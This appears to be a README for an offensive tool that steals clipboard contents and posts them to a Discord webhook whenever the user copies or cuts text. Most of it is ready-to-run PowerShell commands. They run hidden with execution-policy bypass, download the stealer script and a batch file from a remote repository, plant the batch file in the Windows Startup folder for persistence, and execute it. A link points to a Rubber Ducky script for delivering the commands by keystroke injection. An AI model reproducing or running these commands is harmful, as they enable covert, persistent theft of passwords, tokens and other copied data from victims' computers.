# Clipboard Exfiltration Using Discord Webhook

![](https://cyberhoot.com/wp-content/uploads/2019/12/Data-Exfiltration.jpg)


**The powershell scripts posts the clipboard content to the Discord chat when the user presses Ctrl+c or Ctrl+x**

Save update.ps1 to $env:userprofile\AppData\Roaming 

    powershell -w h -NoP -NonI -Ep Bypass 'Invoke-WebRequest -Uri "https://raw.githubusercontent.com/offport/ClipboardExfiltration/main/update.ps1" -OutFile "$env:userprofile\AppData\Roaming\update.ps1" -UseBasicParsing'

**The bat file is placed in startup folder for persistence**

Then save the bat file into startup programs

    powershell -w h -NoP -NonI -Ep Bypass 'Invoke-WebRequest -Uri "https://raw.githubusercontent.com/offport/ClipboardExfiltration/main/per.bat" -OutFile "$env:APPDATA\Microsoft\Windows\Start` Menu\Programs\Startup\per.bat" -UseBasicParsing'

Then run the bat file for the first time

    Invoke-Expression -Command "& '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\per.bat'" 

**All together**

```
powershell -w h -NoP -NonI -Ep Bypass 'Invoke-WebRequest -Uri "https://raw.githubusercontent.com/offport/ClipboardExfiltration/main/update.ps1" -OutFile "$env:userprofile\AppData\Roaming\update.ps1" -UseBasicParsing'
powershell -w h -NoP -NonI -Ep Bypass 'Invoke-WebRequest -Uri "https://raw.githubusercontent.com/offport/ClipboardExfiltration/main/per.bat" -OutFile "$env:APPDATA\Microsoft\Windows\Start` Menu\Programs\Startup\per.bat" -UseBasicParsing'
Invoke-Expression -Command "& '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\per.bat'" 

```

The rubber ducky script to execute the above commands is [here](./rubberduckyscript.txt)
